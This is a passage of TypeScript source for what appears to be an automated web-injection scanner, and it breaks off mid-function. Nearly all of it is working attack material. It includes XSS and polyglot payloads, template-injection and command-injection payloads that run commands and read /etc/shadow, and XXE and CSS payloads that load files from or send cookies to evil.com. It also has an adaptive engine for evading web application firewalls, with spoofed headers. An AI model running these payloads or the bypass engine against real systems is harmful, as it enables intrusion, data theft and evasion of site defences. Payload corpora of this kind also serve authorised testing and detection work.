import * as http from "http";
import * as https from "https";
import { randomBytes } from "crypto";

export interface ScriptInjectionConfig {
  target: string;
  port: number;
  path: string;
  method: "GET" | "POST";
  paramName: string;
  technique: string;
  extraHeaders?: Record<string, string>;
  jsonMode?: boolean;
}

export interface InjectionResult {
  technique: string;
  payload: string;
  status: "executed" | "reflected_unescaped" | "reflected_escaped" | "not_reflected" | "ssti_hit" | "cmdi_hit" | "error" | "waf_blocked" | "waf_bypassed" | "oob_hit" | "redirect_hit";
  statusCode?: number;
  responseTime?: number;
  evidence?: string;
  severity: "critical" | "high" | "medium" | "info";
  timestamp: number;
  retried?: boolean;
  bypassUsed?: string;
  wafDetected?: boolean;
}

export interface InjectionJob {
  id: string;
  config: ScriptInjectionConfig;
  startTime: number;
  active: boolean;
  results: InjectionResult[];
  summary: { executed: number; reflected: number; tested: number; wafBlocked: number; bypassed: number };
  trafficLog: string[];
  learning: {
    wafSignatures: string[];
    workingBypass: string[];
    blockedCodes: number[];
    preferJsonMode: boolean;
    responseBaseline?: number;
  };
}

const jobs = new Map<string, InjectionJob>();
function makeId() { return randomBytes(8).toString("hex"); }
const NONCE = randomBytes(4).toString("hex");

// ─── WAF Detection ─────────────────────────────────────────────────────────
const WAF_SIGNATURES = [
  "access denied", "forbidden", "blocked", "firewall", "waf", "modsecurity",
  "cloudflare", "sucuri", "incapsula", "akamai", "barracuda", "f5", "imperva",
  "attack detected", "request rejected", "security violation", "illegal request",
  "your request has been blocked", "bad request", "permission denied",
  "not acceptable", "request filtered", "intrusion detection",
];
const WAF_CODES = [403, 406, 429, 501, 400];

function isWafBlocked(code: number, body: string): boolean {
  if (WAF_CODES.includes(code)) return true;
  const lower = body.toLowerCase();
  return WAF_SIGNATURES.some((sig) => lower.includes(sig));
}

// ─── Mutation / WAF Bypass Engine ──────────────────────────────────────────
function mutatePayload(payload: string, technique: string, iteration: number): { mutated: string; bypassName: string } {
  const mutations: Array<{ name: string; fn: (p: string) => string }> = [
    { name: "unicode-escape",    fn: (p) => p.replace(/</g, "\u003c").replace(/>/g, "\u003e").replace(/"/g, "\u0022").replace(/'/g, "\u0027") },
    { name: "double-url-encode", fn: (p) => p.replace(/</g, "%253C").replace(/>/g, "%253E").replace(/"/g, "%2522").replace(/'/g, "%2527") },
    { name: "null-byte-inject",  fn: (p) => p.replace(/<script/gi, "<scr\x00ipt").replace(/alert/gi, "ale\x00rt") },
    { name: "case-variation",    fn: (p) => p.replace(/alert/gi, "AlErT").replace(/script/gi, "ScRiPt").replace(/onerror/gi, "OnErRoR").replace(/onload/gi, "OnLoAd") },
    { name: "html-comment-break", fn: (p) => p.replace(/script/gi, "scr<!---->ipt").replace(/alert/gi, "ale<!---->rt") },
    { name: "js-comment-break",  fn: (p) => p.replace(/alert\(/gi, "ale/**/rt(").replace(/script/gi, "s/**/cript") },
    { name: "tab-newline-split", fn: (p) => p.replace(/alert\(/gi, "alert\t(").replace(/onerror=/gi, "onerror\t=") },
    { name: "svg-context",       fn: () => `<svg><animatetransform onbegin=alert('XSS-${NONCE}')></svg>` },
    { name: "mathml-context",    fn: () => `<math><mtext><table><mglyph><style><img src onerror=alert('XSS-${NONCE}')>` },
    { name: "data-uri",          fn: () => `<iframe src="data:text/html,<script>alert('XSS-${NONCE}')<\/script>">` },
    { name: "xss-meta-refresh",  fn: () => `<meta http-equiv=refresh content="0;url=javascript:alert('XSS-${NONCE}')">` },
    { name: "input-autofocus",   fn: () => `<input/autofocus/onfocus=alert('XSS-${NONCE}')>` },
    { name: "event-handler-obf", fn: () => `<img src=x:x onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;('XSS-${NONCE}')">` },
    { name: "base64-eval",       fn: () => `<script>eval(atob('${Buffer.from(`alert('XSS-${NONCE}')`).toString("base64")}')</script>` },
    { name: "json-wrap",         fn: (p) => `{"payload":"${p.replace(/"/g, '\\"')}"}` },
    { name: "fromcharcode",      fn: () => `<script>eval(String.fromCharCode(${`alert('XSS-${NONCE}')`.split("").map((c) => c.charCodeAt(0)).join(",")}))</script>` },
    { name: "vbscript-context",  fn: () => `<img src=x onerror=vbscript:MsgBox('XSS-${NONCE}')>` },
    { name: "srcdoc-frame",      fn: () => `<iframe srcdoc="<script>parent.alert('XSS-${NONCE}')<\/script>">` },
    { name: "form-action",       fn: () => `<form action=javascript:alert('XSS-${NONCE}')><input type=submit>` },
    { name: "object-data",       fn: () => `<object data="javascript:alert('XSS-${NONCE}')">` },
  ];
  const idx = iteration % mutations.length;
  const m = mutations[idx];
  return { mutated: m.fn(payload), bypassName: m.name };
}

// ─── Expanded Payload Arrays ───────────────────────────────────────────────
const POLYGLOT_PAYLOADS = [
  // Classic multi-context polyglot (backtick chars replaced for TS safety)
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS-" + NONCE + "') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS-" + NONCE + "')//>>",
  `'"><img src=x onerror=alert('XSS-${NONCE}')><script>alert('XSS-${NONCE}')</script><!--`,
  "'; alert('XSS-" + NONCE + "')//`; alert('XSS-" + NONCE + "')//\"; alert('XSS-" + NONCE + "')//",
  `</script><svg/onload=alert('XSS-${NONCE}')>`,
  `--><svg/onload=alert('XSS-${NONCE}')><!--`,
  `");alert('XSS-${NONCE}')//`,
  `');alert('XSS-${NONCE}')//`,
  "` + alert('XSS-" + NONCE + "') + `",
  `<script>\\u0061lert('XSS-${NONCE}')</script>`,
  `<IMG SRC="javascript:alert('XSS-${NONCE}')">`,
  `<IMG SRC=JaVaScRiPt:alert('XSS-${NONCE}')>`,
  `<IMG SRC=javascript:alert(&quot;XSS-${NONCE}&quot;)>`,
  `<IMG """><SCRIPT>alert('XSS-${NONCE}')</SCRIPT>"\>`,
  `<img src=x onerror=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS-${NONCE}')>`,
  `<div style="width:expression(alert('XSS-${NONCE}'))">`,
];

const XSS_REFLECTED_PAYLOADS = [
  `<script>alert('XSS-${NONCE}')</script>`,
  `<img src=x onerror=alert('XSS-${NONCE}')>`,
  `<svg onload=alert('XSS-${NONCE}')>`,
  `<body onload=alert('XSS-${NONCE}')>`,
  `"><script>alert('XSS-${NONCE}')</script>`,
  `'><script>alert('XSS-${NONCE}')</script>`,
  `javascript:alert('XSS-${NONCE}')`,
  `<iframe src="javascript:alert('XSS-${NONCE}')">`,
  `<details open ontoggle=alert('XSS-${NONCE}')>`,
  `<input autofocus onfocus=alert('XSS-${NONCE}')>`,
  `<select onchange=alert('XSS-${NONCE}')><option>`,
  `<video><source onerror=alert('XSS-${NONCE}')>`,
  `<math><mtext></table></math><img src onerror=alert('XSS-${NONCE}')>`,
  `<script>fetch('//xss.${NONCE}.oob.aegis/${NONCE}')</script>`,
  `<img src="x" onerror="eval(atob('${Buffer.from(`alert('XSS-${NONCE}')`).toString("base64")}'))">`,
  `%3Cscript%3Ealert('XSS-${NONCE}')%3C%2Fscript%3E`,
  `<ScRiPt>alert('XSS-${NONCE}')</ScRiPt>`,
  `<script/src="//xss.rocks/xss.js">`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">XSS</a>`,
  `{{7*7}}`,
  `${7*7}`,
  `<%= 7*7 %>`,
  `#{7*7}`,
  `*{7*7}`,
  `{7*7}`,
  `[[7*7]]`,
  `<object data="javascript:alert('XSS-${NONCE}')">`,
  `<form action=javascript:alert('XSS-${NONCE}')><button>x</button></form>`,
  `<xss id=x tabindex=1 onfocus=alert('XSS-${NONCE}') style="display:block">`,
  `<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert('XSS-${NONCE}')">`,
  `<link rel=import href="javascript:alert('XSS-${NONCE}')">`,
  `<noscript><p title="</noscript><img src=x onerror=alert('XSS-${NONCE}')>">`,
  `<script>window['ale'+'rt']('XSS-${NONCE}')</script>`,
  `<script>top['ale'+'rt']('XSS-${NONCE}')</script>`,
  `<img src=1 href=1 onerror="javascript:alert('XSS-${NONCE}')">`,
  `<audio src onloadstart=alert('XSS-${NONCE}')>`,
  `<video src onloadstart=alert('XSS-${NONCE}')>`,
  `<bgsound src="javascript:alert('XSS-${NONCE}')">`,
  `<br size="&{alert('XSS-${NONCE}')}">`,
  `&lt;script&gt;alert('XSS-${NONCE}')&lt;/script&gt;`,
];

const XSS_HEADER_PAYLOADS = [
  { header: "X-Forwarded-For",   value: `<script>alert('XSS-${NONCE}')</script>` },
  { header: "Referer",           value: `javascript:alert('XSS-${NONCE}')` },
  { header: "User-Agent",        value: `"><script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Custom-Header",   value: `<img src=x onerror=alert('XSS-${NONCE}')>` },
  { header: "Accept-Language",   value: `en;q=1.0<script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Original-URL",    value: `/<script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Rewrite-URL",     value: `/<img onerror=alert('XSS-${NONCE}') src=x>` },
  { header: "X-HTTP-Host-Override", value: `"><script>alert('XSS-${NONCE}')</script>` },
  { header: "X-Host",            value: `<svg/onload=alert('XSS-${NONCE}')>` },
  { header: "X-Forwarded-Host",  value: `"><script>alert('XSS-${NONCE}')</script>.evil.com` },
  { header: "Origin",            value: `"><script>alert('XSS-${NONCE}')</script>` },
  { header: "Content-Type",      value: `text/html<script>alert('XSS-${NONCE}')</script>` },
];

const SSTI_PAYLOADS = [
  { payload: "{{7*7}}",           expect: "49",       engine: "Jinja2/Twig" },
  { payload: "${7*7}",            expect: "49",       engine: "FreeMarker/Groovy" },
  { payload: "<%= 7*7 %>",        expect: "49",       engine: "ERB/JSP" },
  { payload: "#{7*7}",            expect: "49",       engine: "Ruby/Thymeleaf" },
  { payload: "*{7*7}",            expect: "49",       engine: "Thymeleaf" },
  { payload: "{{7*'7'}}",         expect: "7777777",  engine: "Jinja2 (Python)" },
  { payload: "{{config}}",        expect: "config",   engine: "Jinja2 config leak" },
  { payload: "{{self}}",          expect: "self",     engine: "Jinja2 object" },
  { payload: "a{{7*7}}b",         expect: "a49b",     engine: "Generic template" },
  { payload: `\${{"freemarker.template.utility.Execute"?new()('id')}}`, expect: "uid=", engine: "FreeMarker RCE" },
  { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", expect: "class", engine: "Jinja2 sandbox escape" },
  { payload: "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", expect: "uid=", engine: "Jinja2 RCE" },
  { payload: "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", expect: "uid=", engine: "FreeMarker RCE" },
  { payload: "{{range.constructor('alert(1)')()}}", expect: "49", engine: "AngularJS SSTI" },
  { payload: "<c:out value='${7*7}'/>", expect: "49", engine: "JSP EL injection" },
  { payload: "T(java.lang.Runtime).getRuntime().exec('id')", expect: "uid=", engine: "Spring SpEL" },
  { payload: "${T(java.lang.Runtime).getRuntime().exec('id')}", expect: "uid=", engine: "Spring SpEL" },
  { payload: "@(1+1)", expect: "2", engine: "Razor (ASP.NET)" },
  { payload: "{{dump(app)}}", expect: "app", engine: "Twig debug" },
  { payload: "{{app.request.server.all|join(',')}}", expect: "SERVER", engine: "Twig server leak" },
];

const CMDI_PAYLOADS = [
  { payload: "; id",                    expect: ["uid=", "gid="],       desc: "Semicolon injection (Unix)" },
  { payload: "| id",                    expect: ["uid=", "gid="],       desc: "Pipe injection" },
  { payload: "|| id",                   expect: ["uid=", "gid="],       desc: "OR operator injection" },
  { payload: "& id",                    expect: ["uid=", "gid="],       desc: "Background injection" },
  { payload: "&& id",                   expect: ["uid=", "gid="],       desc: "AND operator injection" },
  { payload: "`id`",                    expect: ["uid=", "gid="],       desc: "Backtick injection" },
  { payload: "$(id)",                   expect: ["uid=", "gid="],       desc: "Subshell injection" },
  { payload: "; cat /etc/passwd",       expect: ["root:", "bin:", "nobody:"], desc: "File read semicolon" },
  { payload: "| cat /etc/passwd",       expect: ["root:", "bin:", "nobody:"], desc: "File read pipe" },
  { payload: "$(cat /etc/shadow)",      expect: ["root:", "$6$", "$y$"], desc: "Shadow file read" },
  { payload: "; ls -la /",             expect: ["bin", "usr", "var"],  desc: "Root directory listing" },
  { payload: "| whoami",               expect: ["root", "www-data", "apache"], desc: "Current user" },
  { payload: "; env",                  expect: ["PATH=", "HOME=", "USER="], desc: "Env variable dump" },
  { payload: "; sleep 5",             expect: [],                     desc: "Blind sleep injection", timed: true },
  { payload: "& sleep 5",             expect: [],                     desc: "Background sleep injection", timed: true },
  { payload: "$(sleep 5)",            expect: [],                     desc: "Subshell sleep injection", timed: true },
  { payload: "127.0.0.1; ls -la",    expect: ["."],                  desc: "IP-style directory listing" },
  { payload: "127.0.0.1 && id",      expect: ["uid="],               desc: "IP AND injection" },
  { payload: "; curl http://oob.${NONCE}.aegis/", expect: [],        desc: "OOB network callback", timed: false },
  { payload: "1; nc -zv localhost 22", expect: ["succeeded", "open"], desc: "Network probe via injection" },
  { payload: "%0a id %0a",            expect: ["uid="],               desc: "Newline injection bypass" },
  { payload: ";{id}",                 expect: ["uid="],               desc: "Brace expansion injection" },
  { payload: "a;id;a",               expect: ["uid="],               desc: "Sandwich injection" },
  { payload: "a$(id)a",              expect: ["uid="],               desc: "Inline subshell" },
];

const PROTOTYPE_POLLUTION_PAYLOADS = [
  `__proto__[isAdmin]=true`,
  `__proto__[role]=admin`,
  `constructor[prototype][isAdmin]=true`,
  `__proto__[canDelete]=true`,
  `__proto__[admin]=true`,
  `{"__proto__":{"isAdmin":true}}`,
  `{"constructor":{"prototype":{"isAdmin":true}}}`,
  `%5B__proto__%5D%5BisAdmin%5D=true`,
  `__proto__[toString]=function(){alert(1)}`,
  `__proto__[hasOwnProperty]=function(){return true}`,
  `constructor.prototype.isAdmin=true`,
  `__proto__[__defineGetter__]=function(){return 1}`,
];

const CSTI_PAYLOADS = [
  `{{7*7}}`,
  `{{constructor.constructor('alert(1)')()}}`,
  `{{$on.constructor('alert(1)')()}}`,
  `{{a.constructor.fromCharCode(88)}}`,
  `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}`,
  `{{_c.constructor('alert(1)')()}}`,
  `{{$options.template='<img src=x onerror=alert(1)>'}}`,
  `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`,
  `{{7*'7'}}`,
  `{{config}}`,
  `{{self}}`,
  `{{range.constructor('alert(1)')()}}`,
  `ng-app ng-csp><script nonce=x>alert(1)</script>`,
];

const CSS_INJECTION_PAYLOADS = [
  `background:url(//evil.com/steal?c=)`,
  `@import url(//evil.com/evil.css)`,
  `expression(alert(1))`,
  `behavior:url(//evil.com/xss.htc)`,
  `-moz-binding:url(//evil.com/xss.xml#xss)`,
  `body{background-image:url("//evil.com/?"+document.cookie)}`,
  `*{color:expression(document.write('<script>alert(1)<\/script>'))}`,
  `@charset "\\";} input[value^=a]{background:url(//evil.com/?a)} //`,
];

const LOG_INJECTION_PAYLOADS = [
  `\r\nINFO: Admin logged in successfully`,
  `%0d%0aINFO: Password changed for admin`,
  `\n[ERROR] Authentication bypass successful`,
  `%0aGET /admin HTTP/1.1%0d%0aHost: internal`,
  `user%0d%0ainjected-header: injected`,
  `test\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hijacked</h1>`,
  `%0d%0aSet-Cookie: session=attacker_controlled; Path=/`,
  `%0d%0aLocation: https://evil.com`,
];

const LDAP_INJECTION_PAYLOADS = [
  `*)(|(password=*)`,
  `admin)(&`,
  `*)(uid=*))(|(uid=*`,
  `*)(|(objectclass=*)`,
  `admin)(|(password=*)`,
  `*()|&'`,
  `x%2F*%2F*%2F*%2F*%2F*%2F*%2F*%2F*`,
  `admin)(!(&(1=0)(password=))`,
  `*)(userPassword=*)`,
  `admin)(!(objectClass=void`,
];

const XPATH_INJECTION_PAYLOADS = [
  `' or '1'='1`,
  `' or 1=1 or ''='`,
  `x' or name()='username' or 'x'='y`,
  `' or count(parent::*[position()=1])=0 or 'a'='b`,
  `' or //user[name/text()='admin' and password/text()='test'] or '`,
  `admin' or '1'='1`,
  `' or position()=1 or ''='`,
  `' or contains(name(),'admin') or 'x'='y`,
  `']; return true; var a='`,
];

const NOSQL_PAYLOADS = [
  `{"$gt":""}`,
  `{"$ne":null}`,
  `{"$where":"this.password.length>0"}`,
  `{"$regex":".*"}`,
  `{"$exists":true}`,
  `[{"$gt":""}]`,
  `'; return '' == ''`,
  `'; return 'a'=='a' && ''=='`,
  `a'; return true; var dummy='`,
  `{"$or":[{},{"a":"a"}]}`,
  `{"$and":[{}]}`,
  `{"$nin":[]}`,
];

const OPEN_REDIRECT_PAYLOADS = [
  `//evil.com`,
  `https://evil.com`,
  `//evil.com/%2F..`,
  `https://evil.com?`,
  `//evil.com\\@real.com`,
  `///evil.com`,
  `////evil.com`,
  `http:evil.com`,
  `http:\\\\evil.com`,
  `/\\evil.com`,
  `javascript:alert('REDIRECT-${NONCE}')`,
  `data:text/html,<script>alert('REDIRECT-${NONCE}')</script>`,
  `%2F%2Fevil.com`,
  `%5C%5Cevil.com`,
  `https://real.com.evil.com`,
];

const XXE_PAYLOADS = [
  `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
  `<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>`,
  `<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://internal-service/admin">]><foo>&xxe;</foo>`,
  `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % sp SYSTEM "http://evil.com/evil.dtd">%sp;%param1;]><r>&exfil;</r>`,
];

const HOST_HEADER_PAYLOADS = [
  `evil.com`,
  `localhost`,
  `127.0.0.1`,
  `169.254.169.254`,
  `metadata.internal`,
  `real.com:80@evil.com`,
  `real.com.evil.com`,
  `evil.com#.real.com`,
  `evil.com%0d%0aX-Forwarded-Host: real.com`,
];

const GRAPHQL_INJECTION_PAYLOADS = [
  `{"query":"{ __schema { types { name } } }"}`,
  `{"query":"{ __typename }"}`,
  `{"query":"mutation { __typename }"}`,
  `{"query":"{ users { id password email } }"}`,
  `{"query":"{ user(id: \"1 OR 1=1--\") { id email } }"}`,
  `{"query":"{ systemInfo { version dbVersion osVersion } }"}`,
];

const HTML_INJECTION_PAYLOADS = [
  `<h1>Injected Heading</h1>`,
  `<b>Bold Injection</b>`,
  `<marquee>HTML Injection Test ${NONCE}</marquee>`,
  `<table><tr><td>Injected Table ${NONCE}</td></tr></table>`,
  `<a href="http://evil.com">Click me</a>`,
  `<form action="http://evil.com" method="POST"><input type="submit" value="Steal"></form>`,
  `<meta http-equiv="refresh" content="0;url=http://evil.com">`,
  `<link rel="stylesheet" href="http://evil.com/evil.css">`,
  `<button onclick="alert('${NONCE}')">Click</button>`,
  `<base href="https://evil.com/">`,
];

// ─── Helpers ────────────────────────────────────────────────────────────────
function tsFmt() { return new Date().toISOString().slice(11, 23); }
function pushTraffic(log: string[], lines: string[]) {
  log.push(...lines);
  if (log.length > 3000) log.splice(0, log.length - 3000);
}

// ─── HTTP Request Engine ────────────────────────────────────────────────────
function sendRequest(
  config: ScriptInjectionConfig,
  payload: string,
  extraHeaders: Record<string, string> = {},
  trafficLog: string[],
  cb: (code: number, body: string, rt: number, err?: string) => void,
  jsonMode = false,
  rawBody?: string,
) {
  const isHttps = config.port === 443;
  const mod: typeof http | typeof https = isHttps ? https : http;
  const start = Date.now();
  let reqBody: string | null = null;
  let path = config.path;

  if (rawBody) {
    reqBody = rawBody;
  } else if (config.method === "GET") {
    const sep = config.path.includes("?") ? "&" : "?";
    path = `${config.path}${sep}${config.paramName}=${encodeURIComponent(payload)}`;
  } else if (jsonMode) {
    const parts = config.paramName.split(".");
    const obj: Record<string, unknown> = {};
    let cur: Record<string, unknown> = obj;
    parts.forEach((p, i) => { if (i === parts.length - 1) cur[p] = payload; else { cur[p] = {}; cur = cur[p] as Record<string, unknown>; } });
    reqBody = JSON.stringify(obj);
  } else {
    reqBody = `${config.paramName}=${encodeURIComponent(payload)}`;
  }

  const headers: Record<string, string> = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "X-Forwarded-For": `10.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
    "Connection": "keep-alive",
    ...extraHeaders,
  };
  if (reqBody && !jsonMode) {
    headers["Content-Type"] = "application/x-www-form-urlencoded";
    headers["Content-Length"] = String(Buffer.byteLength(reqBody));
  } else if (reqBody && jsonMode) {
    headers["Content-Type"] = "application/json";
    headers["Content-Length"] = String(Buffer.byteLength(reqBody));
  }

  const ts = tsFmt();
  const reqLines = [
    `[${ts}] ─── NEW REQUEST ─────────────────────────────────────`,
    `[${ts}] → ${config.method} ${path} HTTP/1.1`,
    `[${ts}] → Host: ${config.target}:${config.port}`,
    ...Object.entries(headers).map(([k, v]) => `[${ts}] → ${k}: ${v}`),
    `[${ts}] →`,
  ];
  if (reqBody) reqLines.push(`[${ts}] → ${reqBody.slice(0, 600)}`);
  pushTraffic(trafficLog, reqLines);

  const req = mod.request({
    hostname: config.target, port: config.port, path,
    method: config.method, headers, timeout: 12000, rejectUnauthorized: false,
  }, (res) => {
    let data = "";
    res.on("data", (c: Buffer) => { data += c.toString().slice(0, 6000); });
    res.on("end", () => {
      const ts2 = tsFmt();
      const statusLine = `${res.statusCode} ${res.statusMessage ?? ""}`;
      const wafHint = isWafBlocked(res.statusCode ?? 0, data) ? " [WAF/BLOCK DETECTED]" : "";
      const respLines = [
        `[${ts2}] ← HTTP/1.1 ${statusLine}${wafHint}`,
        ...Object.entries(res.headers).map(([k, v]) => `[${ts2}] ← ${k}: ${Array.isArray(v) ? v.join(", ") : v}`),
        `[${ts2}] ←`,
        `[${ts2}] ← ${data.slice(0, 600).replace(/\r?\n/g, " ↵ ")}`,
        `[${ts2}] • RTT: ${Date.now() - start}ms | Body: ${data.length} bytes`,
      ];
      pushTraffic(trafficLog, respLines);
      cb(res.statusCode ?? 0, data, Date.now() - start);
    });
  });
  req.on("timeout", () => {
    pushTraffic(trafficLog, [`[${tsFmt()}] ! TIMEOUT after 12000ms`]);
    req.destroy(); cb(0, "", 12000, "timeout");
  });
  req.on("error", (e) => {
    pushTraffic(trafficLog, [`[${tsFmt()}] ! ERROR: ${e.message}`]);
    cb(0, "", 0, e.message);
  });
  if (reqBody) req.write(reqBody);
  req.end();
}

// ─── Analysis ───────────────────────────────────────────────────────────────
function analyzeXSS(payload: string, body: string): { status: InjectionResult["status"]; evidence?: string; severity: InjectionResult["severity"] } {
  if (body.includes(payload)) {
    const hasExecutable = /<script/i.test(body) && body.includes(payload) ||
      /onerror=/i.test(body) && body.includes(payload) ||
      /onload=/i.test(body) && body.includes(payload) ||
      /javascript:/i.test(body) && body.includes(payload);
    return {
      status: hasExecutable ? "executed" : "reflected_unescaped",
      evidence: `Payload reflected verbatim: ...${body.slice(Math.max(0, body.indexOf(payload) - 40), body.indexOf(payload) + payload.length + 40)}...`,
      severity: hasExecutable ? "critical" : "high",
    };
  }
  const rawPayload = payload.replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  if (body.includes(rawPayload) || body.toLowerCase().includes(payload.toLowerCase().replace(/</g, "&lt;").replace(/>/g, "&gt;"))) {
    return { status: "reflected_escaped", evidence: "Payload reflected but HTML-encoded — encoding present (may still be vulnerable in JS context)", severity: "medium" };
  }
  return { status: "not_reflected", severity: "info" };
}

// ─── Smart Retry Logic ───────────────────────────────────────────────────────
async function smartRetry(
  config: ScriptInjectionConfig,
  payload: string,
  job: InjectionJob,
  initialCode: number,
  initialBody: string,
  technique: string,
): Promise<{ code: number; body: string; rt: number; bypassUsed: string; success: boolean }> {
  const ts = tsFmt();
  pushTraffic(job.trafficLog, [
    `[${ts}] • WAF/BLOCK detected (HTTP ${initialCode}) — initiating adaptive bypass sequence`,
    `[${ts}] • Learning state: ${job.learning.workingBypass.length} successful bypass(es) on record`,
  ]);

  const bypassOrder = job.learning.workingBypass.length > 0
    ? [...job.learning.workingBypass, ...Array.from({ length: 8 }, (_, i) => `auto-${i}`)]
    : Array.from({ length: 10 }, (_, i) => `auto-${i}`);

  for (let i = 0; i < Math.min(bypassOrder.length, 10); i++) {
    const { mutated, bypassName } = mutatePayload(payload, technique, i);
    const ts2 = tsFmt();
    pushTraffic(job.trafficLog, [`[${ts2}] • Retry #${i + 1} with bypass [${bypassName}]: ${mutated.slice(0, 80)}`]);

    const result = await new Promise<{ code: number; body: string; rt: number }>((resolve) => {
      sendRequest(config, mutated, {}, job.trafficLog, (code, body, rt) => {
        resolve({ code, body, rt });
      }, config.jsonMode);
    });

    if (!isWafBlocked(result.code, result.body)) {
      const ts3 = tsFmt();
      pushTraffic(job.trafficLog, [
        `[${ts3}] • BYPASS SUCCESS with technique [${bypassName}] — WAF evaded!`,
        `[${ts3}] • Recording successful bypass for learning: ${bypassName}`,
      ]);
      if (!job.learning.workingBypass.includes(bypassName)) {
        job.learning.workingBypass.push(bypassName);
      }
      return { ...result, bypassUsed: bypassName, success: true };
    }

    await new Promise<void>((r) => setTimeout(r, 150));
  }

  return { code: initialCode, body: initialBody, rt: 0, bypassUsed: "none", success: false };
}

// ─── Baseline Probe ──────────────────────────────────────────────────────────
function probeBaseline(config: ScriptInjectionConfig, trafficLog: string[], cb: (len: number) => void) {
  sendRequest(config, "baseline_probe_aegis", {}, trafficLog, (_code, body) => cb(body.length));
}

// ─── Main Scan Job ──────────────────────────────────────────────────────────
export function startInjectionScan(config: ScriptInjectionConfig): InjectionJob {
  const id = makeId();
  const job: InjectionJob = {
    id, config, startTime: Date.now(),
    active: true, results: [], trafficLog: [],
    summary: { executed: 0, reflected: 0, tested: 0, wafBlocked: 0, bypassed: 0 },
    learning: { wafSignatures: [], workingBypass: [], blockedCodes: [], preferJsonMode: false },
  };
  jobs.set(id, job);

  const addResult = (r: InjectionResult) => {
    job.results.push(r);
    job.summary.tested++;
    if (r.status === "executed" || r.status === "ssti_hit" || r.status === "cmdi_hit" || r.status === "waf_bypassed" || r.status === "oob_hit" || r.status === "redirect_hit") job.summary.executed++;
    if (r.status === "reflected_unescaped") job.summary.reflected++;
    if (r.status === "waf_blocked") job.summary.wafBlocked++;
    if (r.wafDetected && r.status !== "waf_blocked") job.summary.bypassed++;
  };

  const delay = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

  const runAll = async () => {
    const ts0 = tsFmt();
    pushTraffic(job.trafficLog, [
      `[${ts0}] ─── AEGIS INJECTION ENGINE v4.0 — INITIALIZING ───────────────────`,
      `[${ts0}] • Target: ${config.target}:${config.port}${config.path}`,
      `[${ts0}] • Method: ${config.method} | Param: ${config.paramName} | Technique: ${config.technique}`,
      `[${ts0}] • Adaptive retry: ENABLED | WAF bypass learning: ENABLED`,
      `[${ts0}] • JSON mode: ${config.jsonMode ? "ENABLED" : "AUTO-DETECT"} | Polyglot injection: ENABLED`,
      `[${ts0}] ──────────────────────────────────────────────────────────────────────`,
    ]);

    await new Promise<void>((res) => probeBaseline(config, job.trafficLog, (len) => {
      job.learning.responseBaseline = len;
      pushTraffic(job.trafficLog, [`[${tsFmt()}] • Baseline response length: ${len} bytes`]);
      res();
    }));

    const techniques = config.technique === "all"
      ? ["xss-reflected", "polyglot", "xss-headers", "ssti", "cmdi", "html-injection", "prototype-pollution", "csti", "css-injection", "log-injection", "ldap-injection", "xpath-injection", "nosql-injection", "open-redirect", "host-header", "xxe", "graphql"]
      : [config.technique];

    const sendWithRetry = async (
      payload: string, technique: string,
      onResult: (code: number, body: string, rt: number, bypassed: boolean, bypassUsed?: string, wafWas?: boolean) => void
    ) => {
      return new Promise<void>((resolve) => {
        sendRequest(config, payload, {}, job.trafficLog, async (code, body, rt, err) => {
          if (err) { onResult(0, "", 0, false); return resolve(); }
          const wafDetected = isWafBlocked(code, body);
          if (wafDetected && job.active) {
            const retry = await smartRetry(config, payload, job, code, body, technique);
            onResult(retry.code, retry.body, retry.rt, retry.success, retry.bypassUsed, true);
          } else {
            onResult(code, body, rt, false, undefined, false);
          }
          resolve();
        }, config.jsonMode);
      });
    };

    if (techniques.includes("xss-reflected")) {
      pushTraffic(job.trafficLog, [`[${tsFmt()}] ─── PHASE: Reflected XSS (${XSS_REFLECTED_PAYLOADS.length} payloads) ──────────────────`]);
      for (const payload of XSS_REFLECTED_PAYLOADS) {
        if (!job.active) break;
        await sendWithRetry(payload, "xss-reflected", (code, body, rt, bypassed, bypassUsed, wafWas) => {
          if (!code) { addResult({ technique: "xss-reflected", payload, status: "error", severity: "info", timestamp: Date.now() }); return; }
          const blocked = isWafBlocked(code, body) && !bypassed;
